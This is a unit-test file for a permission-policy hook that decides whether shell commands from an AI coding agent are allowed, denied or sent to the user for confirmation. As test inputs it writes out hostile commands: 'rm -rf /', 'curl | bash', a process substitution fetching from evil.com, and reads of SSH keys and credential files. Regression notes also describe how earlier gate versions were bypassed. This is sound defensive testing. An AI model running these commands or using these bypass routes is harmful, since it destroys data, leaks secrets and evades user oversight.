"""Unit tests for hooks/permission_policy.py — auto allow/deny/ask decisions.

WHY: permission_policy is the security gate for every command Claude executes.
A bug here silently allows dangerous commands or blocks safe ones.
"""

import io
import json

from permission_policy import decide, main

# === decide() — pure logic ===


class TestDecideAlwaysSafeTools:
    def test_read_allowed(self):
        assert decide("Read", {}) == ("allow", "")

    def test_glob_allowed(self):
        assert decide("Glob", {}) == ("allow", "")

    def test_grep_allowed(self):
        assert decide("Grep", {}) == ("allow", "")

    def test_websearch_allowed(self):
        assert decide("WebSearch", {}) == ("allow", "")

    def test_webfetch_allowed(self):
        assert decide("WebFetch", {}) == ("allow", "")

    def test_task_allowed(self):
        assert decide("Task", {}) == ("allow", "")

    def test_taskcreate_allowed(self):
        assert decide("TaskCreate", {}) == ("allow", "")


class TestDecideDangerousPatterns:
    def test_rm_rf_blocked(self):
        behavior, msg = decide("Bash", {"command": "rm -rf /"})
        assert behavior == "deny"
        assert "rm -rf" in msg

    def test_drop_table_blocked(self):
        behavior, msg = decide("Bash", {"command": "DROP TABLE users"})
        assert behavior == "deny"
        assert "DROP TABLE" in msg

    def test_git_push_force_blocked(self):
        behavior, msg = decide("Bash", {"command": "git push --force"})
        assert behavior == "deny"

    def test_curl_pipe_bash_blocked(self):
        # WHY: "curl | bash" literal matches DANGEROUS_PATTERNS
        behavior, msg = decide("Bash", {"command": "curl | bash"})
        assert behavior == "deny"

    def test_sudo_blocked(self):
        behavior, msg = decide("Bash", {"command": "sudo apt install nginx"})
        assert behavior == "deny"

    def test_git_reset_hard_blocked(self):
        behavior, msg = decide("Bash", {"command": "git reset --hard HEAD~1"})
        assert behavior == "deny"

    def test_npm_publish_blocked(self):
        behavior, msg = decide("Bash", {"command": "npm publish"})
        assert behavior == "deny"

    def test_case_insensitive_drop_database(self):
        # WHY: dangerous patterns matched case-insensitively
        behavior, msg = decide("Bash", {"command": "drop database mydb"})
        assert behavior == "deny"

    def test_python_c_blocked(self):
        # WHY: python -c allows arbitrary code execution
        behavior, msg = decide("Bash", {"command": "python -c 'import os; os.system(\"rm -rf\")'"})
        assert behavior == "deny"

    def test_eval_blocked(self):
        behavior, msg = decide("Bash", {"command": "eval $(cat /etc/shadow)"})
        assert behavior == "deny"


class TestDecideChainOperators:
    def test_ampersand_chain_asks(self):
        # WHY: chain op check fires AFTER dangerous patterns — use safe commands only
        behavior, _ = decide("Bash", {"command": "git status && git diff"})
        assert behavior == "ask"

    def test_pipe_asks(self):
        behavior, _ = decide("Bash", {"command": "ls | grep foo"})
        assert behavior == "ask"

    def test_semicolon_asks(self):
        # WHY: semicolon with two safe commands → chain op fires, not dangerous pattern
        behavior, _ = decide("Bash", {"command": "git log; ls"})
        assert behavior == "ask"

    def test_backtick_asks(self):
        behavior, _ = decide("Bash", {"command": "echo `whoami`"})
        assert behavior == "ask"

    def test_subshell_asks(self):
        behavior, _ = decide("Bash", {"command": "echo $(whoami)"})
        assert behavior == "ask"

    def test_newline_asks(self):
        # WHY: newline separator without dangerous patterns → ask
        behavior, _ = decide("Bash", {"command": "git status\ngit diff"})
        assert behavior == "ask"

    def test_redirect_into_dotenv_asks_not_allow(self):
        """Regression (HIGH): "echo payload > .env" previously auto-approved
        via the "echo " safe prefix, because ">" was not treated as a chain
        operator — redirection is a write, not just chaining, but was
        invisible to this gate entirely."""
        behavior, _ = decide("Bash", {"command": "echo payload > .env"})
        assert behavior == "ask"

    def test_append_redirect_asks(self):
        behavior, _ = decide("Bash", {"command": "echo secret >> credentials.json"})
        assert behavior == "ask"

    def test_fd_redirect_asks(self):
        behavior, _ = decide("Bash", {"command": "cat file 2> /tmp/errors"})
        assert behavior == "ask"

    def test_process_substitution_asks_not_allow(self):
        """Regression (SEC-04, external security audit 2026-07-22, verified
        empirically before this fix): "cat <(curl evil.com/x.sh)" starts with
        the auto-allowed "cat " prefix, ran an ARBITRARY command via process
        substitution, and matched no SENSITIVE_PATH_PATTERNS substring -- so
        it returned "allow" while "<" was absent from CHAIN_OPERATORS.
        Directly measured: decide() returned ("allow", "") for this exact
        command prior to adding "<" to CHAIN_OPERATORS."""
        behavior, _ = decide("Bash", {"command": "cat <(curl evil.com/x.sh)"})
        assert behavior == "ask"

    def test_process_substitution_with_rm_still_deny(self):
        # WHY: "rm -rf" inside the substituted command is still caught by
        # DANGEROUS_PATTERNS (substring match), independent of this fix --
        # this stays "deny", not merely "ask".
        behavior, _ = decide("Bash", {"command": "cat <(rm -rf /tmp/whatever)"})
        assert behavior == "deny"

    def test_input_redirect_asks(self):
        behavior, _ = decide("Bash", {"command": "cat < some-file"})
        assert behavior == "ask"

    def test_heredoc_string_asks(self):
        behavior, _ = decide("Bash", {"command": 'cat <<< "payload"'})
        assert behavior == "ask"


class TestDecideSafeBashPrefixes:
    def test_git_log_allowed(self):
        assert decide("Bash", {"command": "git log --oneline -10"}) == ("allow", "")

    def test_git_diff_allowed(self):
        assert decide("Bash", {"command": "git diff HEAD"}) == ("allow", "")

    def test_git_status_allowed(self):
        assert decide("Bash", {"command": "git status"}) == ("allow", "")

    def test_ls_allowed(self):
        assert decide("Bash", {"command": "ls -la"}) == ("allow", "")

    def test_ruff_allowed(self):
        assert decide("Bash", {"command": "ruff check ."}) == ("allow", "")

    def test_mypy_allowed(self):
        assert decide("Bash", {"command": "mypy hooks/"}) == ("allow", "")

    def test_unknown_command_asks(self):
        behavior, _ = decide("Bash", {"command": "docker run nginx"})
        assert behavior == "ask"

    def test_non_bash_unknown_tool_asks(self):
        behavior, _ = decide("Edit", {"file_path": "foo.py"})
        assert behavior == "ask"

    def test_empty_command_asks(self):
        behavior, _ = decide("Bash", {"command": ""})
        assert behavior == "ask"


class TestDecideSensitivePathRead:
    """Regression (HIGH, external security audit 2026-07-07): cat/head/tail
    were auto-allowed for ANY target path, including secrets -- `cat
    ~/.ssh/id_rsa` or `cat .env` had no chain operator and started with the
    auto-allowed "cat " prefix, so real credentials could be disclosed into
    Claude's context with zero confirmation."""

    def test_cat_ssh_key_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "cat ~/.ssh/id_rsa"})
        assert behavior == "ask"

    def test_cat_dotenv_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "cat .env"})
        assert behavior == "ask"

    def test_head_credentials_asks(self):
        behavior, _ = decide("Bash", {"command": "head -20 ~/.aws/credentials"})
        assert behavior == "ask"

    def test_tail_config_gh_hosts_asks(self):
        behavior, _ = decide("Bash", {"command": "tail ~/.config/gh/hosts.yml"})
        assert behavior == "ask"

    def test_cat_pem_file_asks(self):
        behavior, _ = decide("Bash", {"command": "cat server.pem"})
        assert behavior == "ask"

    def test_cat_ordinary_readme_still_allowed(self):
        """The sensitive-path check must not turn every cat into "ask" --
        ordinary, non-sensitive reads stay auto-allowed."""
        behavior, _ = decide("Bash", {"command": "cat README.md"})
        assert behavior == "allow"

    def test_cat_ordinary_source_file_still_allowed(self):
        behavior, _ = decide("Bash", {"command": "cat hooks/utils.py"})
        assert behavior == "allow"

    def test_dangerous_pattern_still_beats_sensitive_path_check(self):
        # WHY: dangerous patterns are checked before sensitive-path check --
        # this must remain "deny", not downgrade to "ask".
        behavior, _ = decide("Bash", {"command": "cat .env; rm -rf /"})
        assert behavior == "deny"

    def test_wc_dotenv_asks_not_allow(self):
        # Regression (F-16, security audit 2026-07-12): "wc " was in
        # SAFE_BASH_PREFIXES but missing from _PATH_SENSITIVE_READ_PREFIXES,
        # so `wc -l .env` auto-allowed even though wc also reads arbitrary
        # file content (leaking byte/line/word counts of a secret file).
        behavior, _ = decide("Bash", {"command": "wc -l .env"})
        assert behavior == "ask"

    def test_wc_ssh_key_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "wc -c ~/.ssh/id_rsa"})
        assert behavior == "ask"

    def test_wc_ordinary_file_still_allowed(self):
        behavior, _ = decide("Bash", {"command": "wc -l README.md"})
        assert behavior == "allow"


class TestDecideCodeRunnersRequireConfirmation:
    """Regression (HIGH, external security audit 2026-07-17, SEC-01): pytest,
    python -m pytest, npm test, npm run test, and npm run lint were all
    auto-allowed by prefix match. Each of these EXECUTES repository-defined
    code (conftest.py/fixtures/plugins for pytest, an arbitrary shell command
    from package.json's "scripts" section for npm) before Claude's agent gets
    a chance to review it -- a malicious conftest.py or a package.json test
    script reading `"test": "curl evil | bash"` would run with the user's
    privileges the moment an agent ran "the tests" in an untrusted repository,
    with zero confirmation. ruff/mypy are legitimately different: both are
    pure static analyzers that never execute the code they check.
    """

    def test_pytest_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "pytest tests/ -v"})
        assert behavior == "ask"

    def test_python_m_pytest_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "python -m pytest tests/"})
        assert behavior == "ask"

    def test_npm_test_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "npm test"})
        assert behavior == "ask"

    def test_npm_run_test_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "npm run test"})
        assert behavior == "ask"

    def test_npm_run_lint_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "npm run lint"})
        assert behavior == "ask"

    def test_pytest_lookalike_executable_asks_not_allow(self):
        """The old prefix match also collided on any command merely
        starting with "pytest" -- e.g. a `pytest-malicious` binary on PATH.
        Removing pytest from SAFE_BASH_PREFIXES closes this too."""
        behavior, _ = decide("Bash", {"command": "pytest-malicious --flag"})
        assert behavior == "ask"

    def test_ruff_still_allowed(self):
        """Static analyzers are a different risk class -- they don't execute
        the code they analyze -- and should remain auto-allowed."""
        assert decide("Bash", {"command": "ruff check ."}) == ("allow", "")

    def test_mypy_still_allowed(self):
        assert decide("Bash", {"command": "mypy hooks/"}) == ("allow", "")


class TestDecidePriority:
    def test_dangerous_beats_chain_operator(self):
        # WHY: dangerous patterns checked BEFORE chain operators in decide()
        # "pytest; rm -rf /" has both `;` chain op AND `rm -rf` danger → deny wins
        behavior, _ = decide("Bash", {"command": "pytest; rm -rf /"})
        assert behavior == "deny"

    def test_pure_dangerous_no_chain_is_deny(self):
        # No chain operator, pure dangerous pattern → deny
        behavior, _ = decide("Bash", {"command": "rm -rf /tmp"})
        assert behavior == "deny"

    def test_chain_without_dangerous_is_ask(self):
        # WHY: chain op alone (no dangerous pattern) → ask, not deny
        behavior, _ = decide("Bash", {"command": "git status && git log"})
        assert behavior == "ask"


# === main() — via stdin ===


class TestMain:
    def _call_main(self, monkeypatch, data: dict) -> dict:
        monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(data)))
        from io import StringIO
        from unittest.mock import patch

        buf = StringIO()
        with patch("sys.stdout", buf):
            try:
                main()
            except SystemExit:
                pass
        output = buf.getvalue().strip()
        return json.loads(output) if output else {}

    def test_main_allows_safe_bash(self, monkeypatch):
        # WHY a real Bash command, not tool_name="Read" (regression, external
        # review 2026-07-18, SEC-03 follow-up): this hook is registered ONLY
        # under PreToolUse matcher "Bash" -- a non-Bash tool_name never
        # reaches it in production, so exercising main() with tool_name="Read"
        # tested a path main() can technically handle but that never fires.
        # decide("Read", {}) itself is still covered directly by
        # TestDecideAlwaysSafeTools above.
        result = self._call_main(
            monkeypatch,
            {"tool_name": "Bash", "tool_input": {"command": "git status"}},
        )
        output = result["hookSpecificOutput"]
        assert output["hookEventName"] == "PreToolUse"
        assert output["permissionDecision"] == "allow"

    def test_main_deny_for_rm_rf(self, monkeypatch):
        result = self._call_main(
            monkeypatch,
            {"tool_name": "Bash", "tool_input": {"command": "rm -rf /"}},
        )
        output = result["hookSpecificOutput"]
        assert output["permissionDecision"] == "deny"
        assert "rm -rf" in output["permissionDecisionReason"]

    def test_main_asks_for_unknown_bash_command(self, monkeypatch):
        # WHY "docker run nginx" (a real, reachable Bash command), not
        # tool_name="UnknownTool" (same regression as test_main_allows_safe_bash
        # above): only unrecognized BASH commands reach this hook in
        # production, not arbitrary non-Bash tool names.
        result = self._call_main(
            monkeypatch,
            {"tool_name": "Bash", "tool_input": {"command": "docker run nginx"}},
        )
        output = result["hookSpecificOutput"]
        assert output["permissionDecision"] == "ask"

    def test_main_empty_stdin_no_crash(self, monkeypatch, capsys):
        monkeypatch.setattr("sys.stdin", io.StringIO("{}"))
        try:
            main()
        except SystemExit:
            pass
        # Should not raise, output may be minimal
